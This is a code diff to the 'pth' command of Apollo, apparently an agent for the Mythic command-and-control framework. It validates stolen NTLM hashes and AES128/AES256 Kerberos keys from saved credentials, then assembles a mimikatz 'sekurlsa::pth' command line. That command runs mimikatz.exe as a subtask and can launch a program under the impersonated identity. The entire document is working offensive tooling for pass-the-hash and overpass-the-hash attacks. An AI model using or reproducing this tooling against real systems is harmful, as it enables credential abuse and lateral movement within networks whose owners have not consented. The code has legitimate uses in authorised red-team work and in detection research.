@@ -1,11 +1,20 @@
 from mythic_container.MythicCommandBase import *
-import json
-from uuid import uuid4
-from apollo.mythic.sRDI import ShellcodeRDI
-from os import path
 from mythic_container.MythicRPC import *
-import base64
-import sys
+import mslex
+import re
+
+
+def valid_ntlm_hash(hash):
+    return re.match(r"^[a-zA-Z0-9]{32}$", hash) is not None
+
+
+def valid_aes128_key(key):
+    return re.match(r"^[a-zA-Z0-9]{32}$", key) is not None
+
+
+def valid_aes256_key(key):
+    return re.match(r"^[a-zA-Z0-9]{64}$", key) is not None
+
 
 class PthArguments(TaskArguments):
 
@@ -13,133 +22,148 @@ class PthArguments(TaskArguments):
         super().__init__(command_line, **kwargs)
         self.args = [
             CommandParameter(
-                name="domain",
-                cli_name="Domain",
-                display_name="Domain", 
-                type=ParameterType.String, 
-                description="Domain associated with user.",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        ui_position=1,
-                        required=True
-                    )
-                ]),
-            CommandParameter(
-                name="user",
-                cli_name="User",
-                display_name="User", 
-                type=ParameterType.String, 
-                description="Username associated with the NTLM hash.",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        ui_position=2,
-                        required=True
-                    )
-                ]),
-            CommandParameter(
-                name="ntlm",
-                cli_name="NTLM",
-                display_name="NTLM", 
-                type=ParameterType.String, 
-                description="User's NTLM hash.",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        ui_position=3,
-                        required=True
-                    )
-                ]),
-            CommandParameter(
-                name="aes128",
-                cli_name="AES128",
-                display_name="AES128", 
-                type=ParameterType.String, 
-                description="AES128 key of user. Used for over pass the hash.",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        ui_position=4,
-                        required=False
-                    )
-                ]),
-            CommandParameter(
-                name="aes256",
-                cli_name="AES256",
-                display_name="AES256", 
-                type=ParameterType.String, 
-                description="AES256 key of user. Used for over pass the hash.",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        ui_position=5,
-                        required=False
-                    )
-                ]),
-            CommandParameter(
-                name="run",
-                cli_name="Run",
-                display_name="Program to Run", 
-                type=ParameterType.String, 
-                description="The process to launch under the specified credentials.",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        ui_position=6,
-                        required=False
-                    ),
-                    ParameterGroupInfo(
-                        required=False,
-                        group_name="SavedCredentials",
-                        ui_position=2
-                    )
-                ]),
-        
-            CommandParameter(
                 name="credential",
                 cli_name="Credential",
                 display_name="Credential",
                 type=ParameterType.Credential_JSON,
-                description="Username and hash of the user to impersonate",
+                description="Saved credential of the user to impersonate (either an NTLM hash or AES key).",
                 parameter_group_info=[
                     ParameterGroupInfo(
-                        ui_position=1,
-                        required=True,
-                        group_name="SavedCredentials"
+                        ui_position=1, required=True, group_name="Credential"
                     )
-                ]),
+                ],
+            ),
+            CommandParameter(
+                name="domain",
+                cli_name="Domain",
+                display_name="Domain",
+                type=ParameterType.String,
+                description="Domain associated with user.",
+                parameter_group_info=[
+                    ParameterGroupInfo(group_name="NTLM", ui_position=1, required=True),
+                    ParameterGroupInfo(
+                        group_name="AES128", ui_position=1, required=True
+                    ),
+                    ParameterGroupInfo(
+                        group_name="AES256", ui_position=1, required=True
+                    ),
+                ],
+            ),
+            CommandParameter(
+                name="user",
+                cli_name="User",
+                display_name="User",
+                type=ParameterType.String,
+                description="Username associated with the NTLM hash.",
+                parameter_group_info=[
+                    ParameterGroupInfo(group_name="NTLM", ui_position=2, required=True),
+                    ParameterGroupInfo(
+                        group_name="AES128", ui_position=2, required=True
+                    ),
+                    ParameterGroupInfo(
+                        group_name="AES256", ui_position=2, required=True
+                    ),
+                ],
+            ),
+            CommandParameter(
+                name="ntlm",
+                cli_name="NTLM",
+                display_name="NTLM",
+                type=ParameterType.String,
+                description="User's NTLM hash.",
+                parameter_group_info=[
+                    ParameterGroupInfo(group_name="NTLM", ui_position=3, required=True),
+                ],
+            ),
+            CommandParameter(
+                name="aes128",
+                cli_name="AES128",
+                display_name="AES128",
+                type=ParameterType.String,
+                description="AES128 key of user. Used for over pass the hash.",
+                parameter_group_info=[
+                    ParameterGroupInfo(
+                        group_name="AES128", ui_position=3, required=True
+                    )
+                ],
+            ),
+            CommandParameter(
+                name="aes256",
+                cli_name="AES256",
+                display_name="AES256",
+                type=ParameterType.String,
+                description="AES256 key of user. Used for over pass the hash.",
+                parameter_group_info=[
+                    ParameterGroupInfo(
+                        group_name="AES256", ui_position=3, required=True
+                    )
+                ],
+            ),
+            CommandParameter(
+                name="run",
+                cli_name="Run",
+                display_name="Program to Run",
+                type=ParameterType.String,
+                description="The process to launch under the specified credentials.",
+                parameter_group_info=[
+                    ParameterGroupInfo(
+                        group_name="NTLM", ui_position=4, required=False
+                    ),
+                    ParameterGroupInfo(
+                        group_name="AES128", ui_position=4, required=False
+                    ),
+                    ParameterGroupInfo(
+                        group_name="AES256", ui_position=4, required=False
+                    ),
+                    ParameterGroupInfo(
+                        group_name="Credential", ui_position=2, required=False
+                    ),
+                ],
+            ),
         ]
 
     async def parse_arguments(self):
         if len(self.command_line) and self.command_line[0] == "{":
             self.load_args_from_json_string(self.command_line)
-            username = ""
-            domain = ""
-            ntlm = ""
-            aes128 = self.get_arg("aes128")
-            aes256 = self.get_arg("aes256")
-            run = self.get_arg("run")
-            if self.get_arg("credential"):
-                cred = self.get_arg("credential")
-                username = cred["account"]
-                domain = cred["realm"]
-                ntlm = cred["credential"]
-            else:
-                username = self.get_arg("user")
-                domain = self.get_arg("domain")
-                ntlm = self.get_arg("ntlm")
 
-            cmd = "sekurlsa::pth /domain:{} /user:{} /ntlm:{}".format(
-                domain,
-                username,
-                ntlm
-            )
-            if aes128:
-                cmd += " /aes128:{}".format(aes128)
-            if aes256:
-                cmd += " /aes256:{}".format(aes256)
-            if run:
-                if " " in run:
-                    run = "\'{}\'".format(run)
-                cmd += " /run:{}".format(run)
-            cmd = "\\\"{}\\\"".format(cmd)
+            if credential := self.get_arg("credential"):
+                if realm := credential["realm"]:
+                    self.set_arg("domain", realm)
+                else:
+                    raise RuntimeError(
+                        "Realm value in the selected credential is empty."
+                    )
 
-            self.add_arg("command", "mimikatz.exe {}".format(cmd))
+                if account := credential["account"]:
+                    self.set_arg("user", account)
+                else:
+                    raise RuntimeError(
+                        "Account value in the selected credential is empty."
+                    )
+
+                if credential["type"] == "key":
+                    cred_key = credential["credential"]
+
+                    if valid_aes128_key(cred_key):
+                        self.set_arg("aes128", cred_key)
+                        self.parameter_group_name = "AES128"
+                    elif valid_aes256_key(cred_key):
+                        self.set_arg("aes256", cred_key)
+                        self.parameter_group_name = "AES256"
+                    else:
+                        raise ValueError(
+                            "Selected credential is not a valid AES128 or AES256 key."
+                        )
+                else:   # TODO: Add hash credential type check when Apollo supports tagging
+                        # credential types in Mimikatz output
+                    ntlm_hash = credential["credential"]
+                    if not valid_ntlm_hash(ntlm_hash):
+                        raise ValueError(
+                            "Selected credential is not a valid NTLM hash."
+                        )
+
+                    self.set_arg("ntlm", ntlm_hash)
+                    self.parameter_group_name = "NTLM"
         else:
             raise Exception(
                 "No mimikatz command given to execute.\n\tUsage: {}".format(
@@ -214,12 +238,43 @@ class PthCommand(CommandBase):
             TaskID=taskData.Task.ID,
             Success=True,
         )
-        await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
-            TaskID=taskData.Task.ID,
-            CommandName="execute_pe",
-            Params=taskData.args.get_arg("command"),
-            SubtaskCallbackFunction="parse_credentials"
-        ))
+
+        user = taskData.args.get_arg("user")
+        domain = taskData.args.get_arg("domain")
+
+        arguments = f"/user:{user} /domain:{domain}"
+
+        match taskData.args.get_parameter_group_name():
+            case "NTLM":
+                ntlm = taskData.args.get_arg("ntlm")
+                arguments += f" /ntlm:{ntlm}"
+            case "AES128":
+                aes128 = taskData.args.get_arg("aes128")
+                arguments += f" /aes128:{aes128}"
+            case "AES256":
+                aes256 = taskData.args.get_arg("aes256")
+                arguments += f" /aes256:{aes256}"
+            case _:
+                raise Exception(f"Invalid parameter group name from Mythic: {taskData.args.get_parameter_group_name()}")
+
+        if run := taskData.args.get_arg("run"):
+            run = mslex.quote(run, for_cmd = False)
+            arguments += f" /run:{run}"
+
+        response.DisplayParams = arguments
+        arguments = "sekurlsa::pth " + arguments
+
+        await SendMythicRPCTaskCreateSubtask(
+            MythicRPCTaskCreateSubtaskMessage(
+                TaskID=taskData.Task.ID,
+                CommandName="execute_pe",
+                Params=json.dumps({
+                    "pe_name": "mimikatz.exe",
+                    "pe_arguments": mslex.quote(arguments, for_cmd = False),
+                }),
+                SubtaskCallbackFunction="parse_credentials",
+            )
+        )
         return response
 
     async def process_response(
